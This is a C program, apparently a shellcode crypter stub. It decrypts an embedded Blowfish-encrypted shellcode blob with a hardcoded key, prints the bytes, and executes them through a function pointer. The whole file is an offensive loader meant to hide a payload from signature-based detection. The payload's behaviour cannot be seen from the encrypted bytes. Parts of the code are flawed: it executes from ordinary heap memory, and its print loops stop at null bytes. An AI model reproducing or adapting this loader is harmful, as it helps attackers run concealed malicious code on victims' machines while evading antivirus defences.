#include <stdio.h>
#include <openssl/blowfish.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char **argv){

if( argc != 2 ){
printf("Enter Length of Original Shellcode.\n");
return 1;
}
BF_KEY *key = malloc(sizeof(BF_KEY));

unsigned char *crypt_key = "KeyOfMemories";		//Key
size_t Original_size = atoi(argv[1]);
int Key_Length = strlen(crypt_key);
size_t Rez_size = (Original_size + 7) & (~7);
unsigned char *Encrypted_shellcode = "\xee\xda\x69\xac\xde\x15\x7a\x6d\x25\x55\xcb\x8c\x59\x04\xb6\xf1\x2f\x8a\xa7\x17\x05\xc1\xa2\x31\x6f\x78\x75\x51\xf0\x6c\x8e\x1b";  //Encrypted Shellcode

//Defining key
BF_set_key(key, Key_Length, crypt_key);


printf("Encrypted Shellcode:\n");
unsigned char *etmp = Encrypted_shellcode;
int esize=0;
while(*etmp){
fprintf(stdout,"\\x%2x",*etmp++);
esize++;
}

//Decrypting Shellcode
unsigned char *shellcode = malloc(Rez_size);
unsigned char *Shell_chunk = shellcode;

while (Rez_size) {
  
  BF_ecb_encrypt(Encrypted_shellcode, Shell_chunk, key, BF_DECRYPT);
  Encrypted_shellcode += 8;
  Shell_chunk += 8;
  Rez_size -= 8;
}


//Printing Decrypted shellcode & Execute

printf("\nDecrypted Shellcode:\n");
unsigned char *tmp = shellcode;
int sizo=0;
while(*tmp){
fprintf(stdout,"\\x%02x",*tmp++);
sizo++;
}

printf("\nExecuting Shellcode:\n");
int (*funptr)() = (int(*)())shellcode;

funptr();

return 0;

}
